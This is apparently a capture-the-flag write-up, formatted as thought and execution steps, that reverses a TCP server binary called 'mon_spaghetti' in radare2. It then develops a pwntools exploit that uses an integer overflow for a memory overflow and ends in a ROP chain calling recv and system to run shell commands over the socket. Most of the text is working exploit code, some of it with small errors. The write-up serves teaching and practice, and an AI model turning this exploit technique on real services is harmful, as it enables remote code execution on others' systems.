[
    {
        "type": "thought",
        "content": "We begin with doing some cursory reversing to get an idea of the binary itself."
    },
    {
        "type": "execution",
        "content": "r2 -A mon_spaghetti"
    },
    {
        "type": "thought",
        "content": "We see a getenv and then a system call, which looks interesting at first glance, but turns out to not be anything at all. Moving along into this tcp_server_loop function."
    },
    {
        "type": "execution",
        "content": "s sym.tcp_server_loop"
    },
    {
        "type": "thought",
        "content": "Quickly looking at the calls we see a lot of standard socket calls. We can make an educated guess that this is setting up the server and that probably process_connection will do as it says: process incoming connections to the server. Let\u2019s see what that body will do for us."
    },
    {
        "type": "execution",
        "content": "s sym.process_connection"
    },
    {
        "type": "thought",
        "content": "And here we see where things will get a little fun. We see a recv call followed by a pthread_create. In theory, this should receive information from the socket created in the parent function and then possibly hand off that data into a seperate thread. Let\u2019s see what function will be called in the thread itself.Looks like process_host will be the meat of the thread. Reversing this function shows us that the first bytes received are a type of header:We send these 8 bytes to the server, and then a series of connections occur back to the host and port we specified. In order to test this theory, let\u2019s create a small harness."
    },
    {
        "type": "execution",
        "content": "from pwn import *\nimport socket\nimport threading\nimport random\n\np = random.randint(20000, 50000)\nnum_threads = 90\n\ndef thread_listen(port=9999):\n    l = socket.socket()\n    l.bind(('0.0.0.0', port))\n    l.listen(5)\n\n    for i in xrange(num_threads):\n        c, _ = l.accept()\n        print(c, _)\n\ndef thread_send(c, size1, size2, index=0xffff):\n    pass\n\ndef start_threads():\n    t = threading.Thread(target=thread_listen, args=(p, ))\n    t.daemon = True\n    t.start()\n    return t\n\ncurr_t = start_threads()\n\n# Host to connect to \nr = remote('172.17.0.2', 24242)\n\nn_threads = p16(num_threads)\n\n# Host for the server to connect back to\nconnect_host = socket.inet_aton('172.17.0.1')\n\npayload = n_threads\npayload += p16(p) # port\npayload += connect_host\n\nr.sendline(payload)\n\nr.interactive()"
    },
    {
        "type": "thought",
        "content": "This script will be the basis for continuing our exploit. The script starts one main thread by calling start_threads which has the function thread_listen. Currently, thread_listen simply binds to a random port and prints out the connection for each accepted connection. After this thread is started, we send our 8 byte payload containing our number of connections we want to receive, the port to connect back to, and the host to connect back to (ourselves). Running this script against the docker container results in the followning.\n\nNow that we receive connections, let\u2019s see what we can control in these connections. Looking further in process_host we see the following packet structure being decoded:\n\n2 bytes - Header Version - Must be 1\n2 bytes - Size1 \n4 bytes - Length - Must be <= 0x40000000\nThe first two bytes are a static check against the number 1, so we can hard code that into our exploit. The next 6 bytes are interesting. It appears to be two size values, one 2 bytes and the other 4 bytes. The 4 byte length is checked to be under 0x40000000 and then the sum of both sizes is allocated via malloc. This chunk and size are passed to a recv call to fill with our data as well.\n\nNow that we have this reversed, let\u2019s add a bit more to our exploit to confirm."
    },
    {
        "type": "execution",
        "content": "def thread_listen(port=9999):\n    l = socket.socket()\n    l.bind(('0.0.0.0', port))\n    l.listen(5)\n\n    for i in xrange(num_threads):\n        c, _ = l.accept()\n        print(c, _)\n        t = threading.Thread(target=thread_send, args=(c, 0xad, 0xde00))\n        t.start()\n\ndef thread_send(c, size1, size2):\n    version = p16(1)\n\n    # malloc(size1 + size2 + 8)\n    # size1 = p16(size1) # 16 bit size\n    # size2 = p32(size2) # 32 bit size, must be <= 0x40000000\n\n    header = version + p16(size1-8) + p32(size2)\n\n    payload = header\n    payload += 'A' * (size1 + size2))\n    c.send(payload)"
    },
    {
        "type": "thought",
        "content": "Here, we add a bit more logic to our thread_send function so that we send the correct header filled with enough A to fill the sum of the sizes.\n\nAlso, now that we are going to be debugging the binary, let\u2019s be sure to change our send to and connect back IPs to localhost so we can debug locally. To check that we are correct with our reversing, let\u2019s break at the malloc and see if our size (0xde00 + 0xad) is correct.\n\nOnce we send a correct header, the binary attempts to process our request in process_host. There is a apparently some functionality when requesting three types of opcodes: E, T, H. If curious about what these do, feel free to look at the binary. Luckily for this writeup, this functionality is useless. The main part of process_host is the parse_opcode function.This loop is a copy loop copying loop_counter bytes into our destination. Essentially, if we can control this value, we could potentially overflow the destination buffer. Now let\u2019s check to see where loop_counter comes from.Looking at the end of this block, we check that copy_length+1 is less than 256, but in a signed comparison see jle. Interesting, this could be an integer overflow. If copy_length is 0x7fffffff then +1 would make it 0x8000000 which is definitely less than 256 in a signed comparison. We\u2019ll keep that in the back of our head for now. Looking at where copy_length comes from, we see it is set in decode_length.\n\nReversing decode_length, we see that a pointer at size1 into our buffer is passed as an argument as well as the pointer to copy_lengthAt this point, the bytes after our first byte is passed to an ntohl call and then shifted by 4 - lower_nibble. This result is stored in copy_length (which we want to be 0x7fffffff). A pointer to size1 + lower_nibble is returned back to us from decode_length. There is one bit of arithmetic that we skipped in parse_opcode.\n\nAfter decode_length, the result is subtracted from the pointer to size1 in our buffer, effectively giving us a the lower nibble of our magic byte from above (1 through 4 for you playing at home). This value is subtracted from an argument to parse_opcode, which turns out to be size2 from our packet. The difference of this subtraction must be greater than our copy_length in order to reach the memcpy like functionality which we believe will give us an overflow. Becuase we control size2 and lower_nibble, we can force an underflow, forcing this comparison to pass."
    },
    {
        "type": "execution",
        "content": "def thread_listen(port=9999):\n    l = socket.socket()\n    l.bind(('0.0.0.0', port))\n    l.listen(5)\n\n    for i in xrange(num_threads):\n        conn, _ = l.accept()\n        print(conn, _)\n        if i == 0:\n            t = threading.Thread(target=thread_send, args=(conn, 0xffff, 0x9000))\n        else:\n            t = threading.Thread(target=thread_send, args=(conn, 0x20-3, 0x3, i))\n            \n        t.start()\n\ndef thread_send(c, size1, size2, index=0xffff):\n    # malloc(size1 + size2 + 8)\n    # size1 = p16(size1) # 16 bit size\n    # size2 = p32(size2) # 32 bit size, must be <= 0x40000000\n\n    version = p16(1)\n    header = version + p16(size1) + p32(size2)\n    c.send(header)\n\n    if size1 == 0xffff:\n        # First thread\n        buff = '\\xff' * (size1+size2)\n        c.send(buff)\n    else:\n        # All other threads\n        buff = p8(0xff) * (size1)\n        buff += p8(0x84) # Signed first bit\n        buff += p8(0x7f)\n        buff += p8(0xff)\n        buff += p8(0xff)\n\n        c.send(buff)"
    },
    {
        "type": "thought",
        "content": "A few things have changed here. We add an index argument to thread_send in order to differentiate between first and other threads. We add a second thread start in thread_listen. Lastly, we added the two thread bodies in thread_send to send the appropriate buffer depending on which thread is executing.\n\nIf everything worked out, we should be able to see a value of 0x7fffffff in parse_opcode after decode_length is called.\n\nWe have one more step to figure out at this point. We are now crashing at the end of the stack, which probably means that we are copying so much data that we blow past the page boundary. Lucky for us, the binary gives a terminating value of 0x80 to stop copying data. Let\u2019s chunk the first thread\u2019s data so that we don\u2019t blow past the page."
    },
    {
        "type": "execution",
        "content": "if size1 == 0xffff:\n    # First thread\n    buff = []\n    split_size = 0x200\n    for _ in xrange((size1+size2) / split_size):\n        buff += '\\xff' * (split_size)\n        buff += '\\x80'\n\n    buff = ''.join(buff)\n    c.send(buff)"
    },
    {
        "type": "thought",
        "content": "The only hiccup here was not having our socket file descriptors already on stdin/stdout. We could attempt to dup those, but that would be too much work. We can simply add >&4 to the end of our command to redirect the output to fd 4, which should be our socket.\n\nWe create the ROP chain, adding a bit of ROP NOP sled (aka ret instructions) to the beginning for good measure since we don\u2019t actually know where we will land in the heap and drop it at the end of each of our chunks in our first sent response."
    },
    {
        "type": "execution",
        "content": "recv = p32(0x8048be5)\nsystem = p32(0x80496de)\nret = p32(0x8049702)\nadjust = p32(0x80487ee)\n\nrop = []\nfor _ in xrange(50):\n    rop.append(ret)\n\nrop.append(recv)\nrop.append(adjust) # Clean up the stack for the system call\nrop.append(p32(4)) # Original thread fd\nrop.append(p32(0x804c098)) # Global address to read into\nrop.append(p32(len(command))) # len('/bin/sh ls 1>&4<0\\0')\nrop.append(system)\nrop.append(p32(0x804c098))\nrop.append(p32(0x80808080)) # End the copy\n\nrop = ''.join(rop)\n\nif size1 == 0xffff:\n    buff = ['\\x11\\x22'] # Need a slight adjustment as EIP is 2 bytes off\n    # for _ in xrange((size1+size2+8)/0x200):\n    for _ in xrange((size1+size2)/0x200):\n        buff += '\\xff' * (0x200 - len(rop))\n        buff += rop\n\n    for i in xrange(len(buff) % 4):\n        buff += '\\x80'\n\n    buff = ''.join(buff)\n    c.send(buff)"
    }
]